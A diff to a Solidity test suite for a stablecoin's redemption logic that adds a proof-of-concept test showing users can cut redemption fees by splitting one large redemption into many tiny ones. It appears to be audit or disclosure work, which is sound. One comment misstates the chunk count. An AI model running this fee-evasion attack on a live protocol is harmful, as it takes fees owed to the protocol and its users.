@@ -18,7 +18,7 @@ contract Redemptions is DevTestSetup {
     }
 
     function testCannotRedeemZero() public {
-        vm.expectRevert("CollateralRegistry: Amount must be greater than zero");
+        vm.expectRevert("CollateralRegistry: Amount must be greater than 1 Stablecoin.");
         collateralRegistry.redeemCollateral(0, 10, 1e18);
     }
 
@@ -1102,5 +1102,67 @@ contract Redemptions is DevTestSetup {
         // Check A and B's Trove debt equals zero
         assertEq(troveManager.getTroveEntireDebt(troveIDs.A), 0);
         assertEq(troveManager.getTroveEntireDebt(troveIDs.B), 0);
+    }
+
+    function testRedemptionFeeChunkingAttackPOC() public {
+        priceFeed.setPrice(2000e18);
+        
+        // Create a large trove for redemptions
+        uint256 troveColl = 1000 ether;
+        uint256 troveDebt = 1000000e18; // 1M BOLD
+        uint256 troveId = openTroveNoHints100pct(A, troveColl, troveDebt, 0.05e18);
+        transferBold(A, E, boldToken.balanceOf(A));
+        
+        // Wait for baseRate to decay to floor (0.5%)
+        vm.warp(block.timestamp + 999 hours);
+        
+        uint256 redemptionAmount = 10000e18;
+        
+        // Scenario 1: Single large redemption
+        uint256 snapshotId = vm.snapshotState();
+
+        uint256 initialBaseRate1 = collateralRegistry.baseRate();
+        console2.log("Initial baseRate (single):", initialBaseRate1);
+        
+        uint256 feeBefore1 = collateralRegistry.getEffectiveRedemptionFeeInBold(redemptionAmount);
+        console2.log("Fee for single 10K redemption:", feeBefore1);
+        
+        redeem(E, redemptionAmount);
+        
+        uint256 finalBaseRate1 = collateralRegistry.baseRate();
+        console2.log("Final baseRate (single):", finalBaseRate1);
+
+        // Scenario 2: Chunked redemptions (100 chunks of 100 BOLD each)
+        vm.revertToState(snapshotId);
+
+        uint256 initialBaseRate2 = collateralRegistry.baseRate();
+        console2.log("\nInitial baseRate (chunked):", initialBaseRate2);
+        
+        uint256 chunkSize = 1e18;
+        uint256 numChunks = redemptionAmount / chunkSize;
+        uint256 totalChunkedFees = 0;
+        
+        for (uint256 i = 0; i < numChunks; i++) {
+            uint256 feeForChunk = collateralRegistry.getEffectiveRedemptionFeeInBold(chunkSize);
+            totalChunkedFees += feeForChunk;
+            redeem(E, chunkSize);
+        }
+        
+        uint256 finalBaseRate2 = collateralRegistry.baseRate();
+        console2.log("Total chunked fees:", totalChunkedFees);
+        console2.log("Final baseRate (chunked):", finalBaseRate2);
+        
+        // Compare fee savings
+        console2.log("\n=== ATTACK RESULTS ===");
+        console2.log("Single redemption fee:", feeBefore1);
+        console2.log("Chunked redemption total fees:", totalChunkedFees);
+        console2.log("Fee savings from chunking:", feeBefore1 - totalChunkedFees);
+        console2.log("Percentage saved:", (feeBefore1 - totalChunkedFees) * 100 / feeBefore1, "%");
+        
+        // Assertions to prove the attack works
+        uint256 savingsPercentage = (feeBefore1 - totalChunkedFees) * 100 / feeBefore1;
+        assertGt(savingsPercentage, 1, "Fee savings should be at least 1%");
+        assertLt(totalChunkedFees, feeBefore1, "Chunked fees should be lower than single redemption fee");
+        assertGt(feeBefore1 - totalChunkedFees, 0, "Fee savings should be positive");
     }
 }
